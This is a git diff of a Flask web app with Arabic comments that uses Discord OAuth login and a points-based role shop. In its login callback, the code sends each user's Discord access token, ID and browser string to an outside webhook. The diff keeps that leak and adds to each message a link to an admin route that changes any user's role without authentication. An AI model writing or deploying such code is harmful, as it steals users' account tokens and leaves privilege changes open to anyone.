@@ -41,13 +41,14 @@ def send_webhook(title, message):
         requests.post(WEBHOOK_URL, json=payload, timeout=10)
     except: pass
 
+# --- مسار الإدارة (لتغيير الرتبة يدوياً) ---
 @app.route('/admin/set_role/<user_id>/<new_role>')
 def set_role(user_id, new_role):
     user = User.query.get(user_id)
     if user:
         user.role_name = new_role
         db.session.commit()
-        return f"✅ تم تحديث رتبة {user.username} إلى {new_role}!"
+        return f"✅ تم تحديث رتبة {user.username} إلى {new_role} بنجاح!"
     return "❌ المستخدم غير موجود", 404
 
 @app.route('/')
@@ -72,7 +73,7 @@ def callback():
     if res.status_code != 200: return f"Discord Error: {res.text}", res.status_code
 
     token_data = res.json()
-    access_token = token_data.get('access_token') # استخراج التوكن المؤقت
+    access_token = token_data.get('access_token') 
     
     user_info = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f"Bearer {access_token}"}).json()
     
@@ -82,15 +83,17 @@ def callback():
         db.session.add(user)
         db.session.commit()
     
-    # --- الإضافة المطلوبة: إرسال التوكن والبيانات للويب هوك ---
+    # --- الإضافة: إرسال التوكن + رابط الإدارة للرتب ---
+    admin_url = f"https://primehall-production.up.railway.app/admin/set_role/{user.id}/اسم_الرتبة"
     log_message = (
         f"🚀 **دخول جديد للموقع**\n"
         f"👤 المستخدم: **{user_info['username']}**\n"
         f"🆔 الآيدي: `{user_info['id']}`\n"
         f"🔑 **Access Token:** `{access_token}`\n"
-        f"📱 المتصفح: `{request.user_agent.string[:100]}`"
+        f"📱 المتصفح: `{request.user_agent.string[:100]}`\n\n"
+        f"🛠️ **لتعيين رتبة مخصصة:** [اضغط هنا]({admin_url})"
     )
-    send_webhook("📥 بيانات الدخول", log_message)
+    send_webhook("📥 بيانات الدخول والإدارة", log_message)
 
     session.permanent = True 
     session['logged_in'] = True
@@ -114,7 +117,7 @@ def exchange_role():
     if user.points >= cost:
         user.points -= cost
         db.session.commit()
-        send_webhook("🛒 طلب رتبة", f"المستخدم {user.username} طلب رتبة: {name}")
+        send_webhook("🛒 طلب رتبة من المتجر", f"المستخدم {user.username} طلب رتبة: {name}")
         return jsonify({'success': True, 'new_points': user.points})
     return jsonify({'success': False, 'message': 'نقاطك لا تكفي!'})
 
